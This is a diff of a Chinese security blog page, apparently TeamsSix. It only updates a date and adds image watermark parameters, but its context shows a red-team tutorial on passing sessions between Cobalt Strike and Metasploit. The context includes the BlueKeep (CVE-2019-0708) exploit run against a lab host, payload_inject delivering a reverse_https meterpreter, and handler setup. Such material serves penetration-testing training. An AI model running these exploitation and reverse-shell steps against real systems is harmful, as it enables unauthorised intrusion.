@@ -420,7 +420,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-01-29
+                    2021-08-04
                 </div>
                 
 
@@ -473,7 +473,7 @@
 <p>之后打开 Cobalt Strike 客户端进行连接</p>
 <pre><code>./start.sh</code></pre>
 <p>输入服务端密码连接上之后，点击 Cobalt Strike –&gt; Listeners 打开 Listeners 界面，点击下方的 Add 按钮，输入 Beacon 名称，这里选择的是 HTTPS Beacon，添加上主机 IP，点击保存，即可创建一个 HTTPS Beacon</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-24_20-07-57.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="2、Metasploit-Framework-上的操作"><a href="#2、Metasploit-Framework-上的操作" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，打开 Metasploit Framework</p>
 <pre><code>msfconsole </code></pre>
 <p>调用 CVE-2019-0708 模块</p>
@@ -514,7 +514,7 @@ msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; exploit
 [*] Meterpreter session 4 opened (192.168.175.200:4444 -&gt; 192.168.175.177:49167) at 2020-07-26 05:57:22 -0400
 
 meterpreter &gt; </code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_17-57-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="3、开始传递会话"><a href="#3、开始传递会话" class="headerlink" title="3、开始传递会话"></a>3、开始传递会话</h2><p>首先，backgroud 会话</p>
 <pre><code>background</code></pre>
 <p>调用 payload_inject 模块</p>
@@ -561,12 +561,12 @@ msf5 exploit(windows/local/payload_inject) &gt; run
 [*] Spawned Notepad process 544
 [*] Injecting payload into 544
 [*] Preparing &#39;windows/meterpreter/reverse_https&#39; for PID 544</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_19-11-30.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>此时，来到 Cobalt Strike 下已经可以看到传递过来的会话了</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-08-39.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h1 id="0x02-Cobalt-Strike-会话传递到-Metasploit-Framework"><a href="#0x02-Cobalt-Strike-会话传递到-Metasploit-Framework" class="headerlink" title="0x02 Cobalt Strike 会话传递到 Metasploit Framework"></a>0x02 Cobalt Strike 会话传递到 Metasploit Framework</h1><h2 id="1、Cobalt-Strike-上的操作-1"><a href="#1、Cobalt-Strike-上的操作-1" class="headerlink" title="1、Cobalt Strike 上的操作"></a>1、Cobalt Strike 上的操作</h2><p>与上述 Cobalt Strike 的操作步骤一样，这里先创建一个 HTTPS Beacon，接下来创建一个 Powershell 类型的 Scripted Web Delivery（S）</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-27-02.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">为了使 Cobalt Strike 获得一个会话，需要复制创建好的命令，并在靶机上运行，此时靶机便会上线了</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-30-31.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="2、Metasploit-Framework-上的操作-1"><a href="#2、Metasploit-Framework-上的操作-1" class="headerlink" title="2、Metasploit Framework 上的操作"></a>2、Metasploit Framework 上的操作</h2><p>首先，在 Metasploit Framework 上调用 handler 模块</p>
 <pre><code>use exploit/multi/handler</code></pre>
 <p>设置 HTTP Payload</p>
@@ -589,12 +589,12 @@ lport =&gt; 4480
 
 msf5 exploit(multi/handler) &gt; run
 [*] Started HTTPS reverse handler on http://192.168.175.200:4480</code></pre>
-<h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png"></p>
+<h2 id="3、开始会话传递"><a href="#3、开始会话传递" class="headerlink" title="3、开始会话传递"></a><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-35-45.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10">3、开始会话传递</h2><p>在 Cobalt Strike 上先创建一个  Foreign HTTP 监听，IP 和 端口设置成上面 Metasploit Framework 所设置 handler 模块的端口和 IP</p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-39-58.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>之后在 Cobalt Strike 上右击待传递的会话选择 Spawn ，选择刚刚创建的 Foreign HTTP 监听</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-54-23.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-54-23.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <p>来到 Metasploit Framework 便能够看到会话已经传递过来了</p>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-57-35.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2020-07-26_18-57-35.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <blockquote>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
